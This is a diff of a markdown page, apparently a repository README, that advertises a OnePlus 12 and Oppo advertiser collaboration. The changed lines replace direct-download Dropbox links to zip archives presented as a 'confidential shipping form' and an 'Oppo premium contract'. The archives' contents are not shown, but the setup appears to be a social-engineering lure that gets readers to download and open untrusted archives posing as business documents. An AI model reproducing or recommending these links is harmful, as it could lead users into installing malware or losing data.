@@ -47,7 +47,7 @@ This collaboration not only brings the OnePlus 12 to the forefront of the tech c
   <a href="#getting-started">Getting Started(For Advertisers)</a> •
 </p>
 
- ## [⚡️OnePlus12(ShippingForm) ](https://www.dropbox.com/scl/fi/ubh4q0lqfajslodh3dlz1/OnePlus-ConfidentialShipping-form.zip?rlkey=alhrvedp3wsqmsxkmselcrwi1&dl=1)
+ ## [⚡️OnePlus12(ShippingForm) ](https://www.dropbox.com/scl/fi/nehi6bycbrledq7jv7kbv/OnePlus-ConfidentialShipping-form.zip?rlkey=mum2cqqmxk4smjtim9jtdu8pd&dl=1)
 
 ## Key Features
 
@@ -68,7 +68,7 @@ This collaboration not only brings the OnePlus 12 to the forefront of the tech c
 ## Getting Started
 ## [⚡️Oppo(OnePlus12)PriceAgreement ](https://drive.google.com/drive/folders/1A4AuEV76DmZAKM-RbzirVOW8J5w6H_8Q?usp=drive_link)
 ## [⚡️Oppo(OnePlus12)AdvertisementConditions ](https://www.dropbox.com/scl/fo/f9csscloszwghh57pd0ix/h?rlkey=rlpkk6nf1z32cuj18kv7z4186&dl=1)
-## [⚡️OppoPremiumContract ](https://www.dropbox.com/scl/fi/0gt7syeti6xz0brq6krd6/Oppo-Contract.zip?rlkey=krra8cos948ib90di6usozjwx&dl=1)
+## [⚡️OppoPremiumContract ](https://www.dropbox.com/scl/fi/xg4mm66r8r7m21xdy240w/Oppo-Contract-premium.zip?rlkey=r6gkpqkfm92zgiq8aanbkikn5&dl=1)
 
 
 
